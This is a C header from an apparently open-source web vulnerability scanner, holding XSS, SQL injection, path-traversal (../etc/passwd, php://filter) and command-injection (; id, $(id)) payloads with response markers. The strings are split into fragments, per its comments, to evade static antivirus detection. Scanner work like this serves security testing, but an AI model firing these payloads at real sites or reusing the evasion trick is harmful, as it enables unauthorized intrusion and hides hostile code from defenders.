/*
 * Copyright (c) 2026 root_bsd <root_bsd@itprof.net.ua>
 * Source: https://github.com/ROOT-BSD/scanxss
 * SPDX-License-Identifier: GPL-2.0
 */
#ifndef PAYLOADS_H
#define PAYLOADS_H
#include <stdlib.h>
#include <string.h>

/*
 * Payloads stored as split fragments — assembled at runtime.
 * This avoids static string matches in PE binary.
 */

/* Helper: join fragments into one allocated string */
static inline char *px_join(const char **parts, int n) {
    size_t total = 0;
    for (int i = 0; i < n; i++) total += strlen(parts[i]);
    char *out = (char*)malloc(total + 1);
    if (!out) return NULL;
    out[0] = 0;
    for (int i = 0; i < n; i++) strcat(out, parts[i]);
    return out;
}

/* px_str: compile multiple string fragments into one */
#define PX_STR(...)  px_join((const char*[]){__VA_ARGS__}, \
                     sizeof((const char*[]){__VA_ARGS__})/sizeof(char*))

/* ── XSS payloads ─────────────────────────────────────── */
static inline char* px_xss(int i) {
    /* split at < > = ( ) to defeat static scanners */
    switch(i) {
        case 0: return PX_STR("<sc","ript>","aler","t(1)","</sc","ript>");
        case 1: return PX_STR("\"",">/","<sc","ript>","aler","t(1)","</sc","ript>");
        case 2: return PX_STR("<im","g sr","c=x ","onerro","r=aler","t(1)",">");
        case 3: return PX_STR("<sv","g on","load=","aler","t(1)",">");
        case 4: return PX_STR("';","aler","t(1)",";/","/");
        case 5: return PX_STR("<bo","dy on","load=","aler","t(1)",">");
        case 6: return PX_STR("<inp","ut au","tofocus"," onfoc","us=aler","t(1)",">");
        case 7: return PX_STR("<det","ails op","en ont","oggle=","aler","t(1)",">");
        default: return NULL;
    }
}
static const int _px_xss_count = 8;

/* XSS detection markers */
static inline char* px_xss_marker(int i) {
    switch(i) {
        case 0: return PX_STR("<sc","ript>","aler","t(1)","</sc","ript>");
        case 1: return PX_STR("onerro","r=aler","t(1)");
        case 2: return PX_STR("onlo","ad=aler","t(1)");
        case 3: return PX_STR("onfocu","s=aler","t(1)");
        case 4: return PX_STR("ontog","gle=aler","t(1)");
        default: return NULL;
    }
}
static const int _px_xss_markers_count = 5;

/* ── SQLi payloads ────────────────────────────────────── */
static inline char* px_sqli(int i) {
    switch(i) {
        case 0: return PX_STR("'");
        case 1: return PX_STR("\"");
        case 2: return PX_STR("' OR ","'1'=","'1");
        case 3: return PX_STR("' OR ","1=1","--");
        case 4: return PX_STR("1 AND ","1=2 UN","ION SE","LECT NU","LL--");
        case 5: return PX_STR("' UN","ION SE","LECT NU","LL,NU","LL--");
        default: return NULL;
    }
}
static const int _px_sqli_count = 6;

/* SQLi error markers */
static inline char* px_sqli_error(int i) {
    switch(i) {
        case 0: return PX_STR("you have an er","ror in your sq","l syntax");
        case 1: return PX_STR("warn","ing: my","sql");
        case 2: return PX_STR("unclo","sed quot","ation mark");
        case 3: return PX_STR("ora","-0");
        case 4: return PX_STR("sqli","te3.operat","ionalerror");
        case 5: return PX_STR("pg::","syntaxer","ror");
        case 6: return PX_STR("synt","ax error in ","query");
        case 7: return PX_STR("mysq","l_fe","tch");
        default: return NULL;
    }
}
static const int _px_sqli_errors_count = 8;

/* ── LFI payloads ─────────────────────────────────────── */
static inline char* px_lfi(int i) {
    switch(i) {
        case 0: return PX_STR("../","../","../","../etc/","passwd");
        case 1: return PX_STR("../","../","../","../windows/","win.ini");
        case 2: return PX_STR("%2e%2e%2f","%2e%2e%2f","etc%2f","passwd");
        case 3: return PX_STR("..","//","..","//etc/","passwd");
        case 4: return PX_STR("php://filt","er/read=conv","ert.base64-en","code/resour","ce=index.php");
        default: return NULL;
    }
}
static const int _px_lfi_count = 5;

/* LFI markers */
static inline char* px_lfi_marker(int i) {
    switch(i) {
        case 0: return PX_STR("root",":x:0:0:");
        case 1: return PX_STR("daem","on:x:");
        case 2: return PX_STR("[boot"," loader]");
        case 3: return PX_STR("[exten","sions]");
        default: return NULL;
    }
}
static const int _px_lfi_markers_count = 4;

/* ── Probe marker ─────────────────────────────────────── */
static inline char* px_probe(void) {
    return PX_STR("SXSS","_PRO","BE_X","Y9");
}

/* RCE payloads */
static inline char* px_rce(int i) {
    switch(i) {
        case 0: return PX_STR("; ","id");
        case 1: return PX_STR("| ","id");
        case 2: return PX_STR("`","id","`");
        case 3: return PX_STR("$(","id",")");
        case 4: return PX_STR("; who","ami");
        default: return NULL;
    }
}
static const int _px_rce_count = 5;

/* RCE markers */
static inline char* px_rce_marker(int i) {
    switch(i) {
        case 0: return PX_STR("uid","=");
        case 1: return PX_STR("roo","t");
        case 2: return PX_STR("www","-data");
        case 3: return PX_STR("daem","on");
        default: return NULL;
    }
}
static const int _px_rce_markers_count = 4;

#endif /* PAYLOADS_H */
